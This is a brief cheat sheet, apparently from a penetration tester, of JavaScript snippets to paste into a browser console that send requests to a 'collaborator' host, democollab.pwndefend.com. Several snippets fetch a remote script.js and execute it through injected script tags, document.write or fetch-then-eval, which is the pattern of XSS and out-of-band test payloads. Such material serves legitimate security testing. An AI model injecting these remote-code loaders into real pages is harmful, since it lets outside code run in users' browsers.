# javascriptHTTPRequests


# COLLABORATOR URL = "http://democollab.pwndefend.com"
# Load Broswer Console
# enable pasting
# Update URL

Ever need to send client side requests using javascript? no problemo here's some methods you can throw into the console.

Clearly you can make script files or HTML script elements with these as well :)


###############################
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://democollab.pwndefend.com", false ); // false for synchronous request
xmlHttp.send( null );
xmlHttp.responseText;
################################
const Http = new XMLHttpRequest();
const url='http://democollab.pwndefend.com';
Http.open("GET", url);
Http.send();
###############################
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       // Typical action to be performed when the document is ready:
       document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("GET", "http://democollab.pwndefend.com", true);
xhttp.send();
###############################
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'http://democollab.pwndefend.com/script.js';
document.head.appendChild(script);
###############################
fetch('http://democollab.pwndefend.com/script.js')
    .then(response => response.text())
    .then(text => eval(text))
    .then(() => { /* now you can use your library */ })
###############################
document.write("<script src='http://democollab.pwndefend.com/script.js'></script>");
###############################
eval(await (await fetch('http://democollab.pwndefend.com/script.js')).text())
###############################
